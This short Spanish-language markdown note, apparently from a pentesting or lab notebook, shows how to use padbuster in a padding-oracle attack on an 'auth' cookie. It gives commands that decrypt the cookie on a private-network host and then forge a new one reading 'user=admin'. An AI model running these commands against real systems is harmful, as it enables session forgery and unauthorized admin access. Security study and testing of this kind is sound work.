---
tags: []
---

# Introducción


# Uso

Para que esto funcione se tiene que realizar lo siguiente:

```bash
padbuster URL EncryptedSample BlockSize [Opciones]
```

Ejemplos:

**PARA DESCODIFICAR LA COOKIE**

**Entrada:**
```bash
padbuster http://192.168.1.17/index.php 3U45ZrgkKaW3wGiEwijfk32p72vwyKOH 8 -cookies 'auth=3U45ZrgkKaW3wGiEwijfk32p72vwyKOH'
```

**Salida:**
```
** Finished ***

[+] Decrypted value (ASCII): user=bendu

[+] Decrypted value (HEX): 757365723D62656E6475060606060606

[+] Decrypted value (Base64): dXNlcj1iZW5kdQYGBgYGBg==

-------------------------------------------------------
```


**PARA CODIFICAR UNA NUEVA**

```bash
padbuster http://192.168.1.17/index.php 3U45ZrgkKaW3wGiEwijfk32p72vwyKOH 8 -cookies 'auth=3U45ZrgkKaW3wGiEwijfk32p72vwyKOH' -plaintext 'user=admin'
```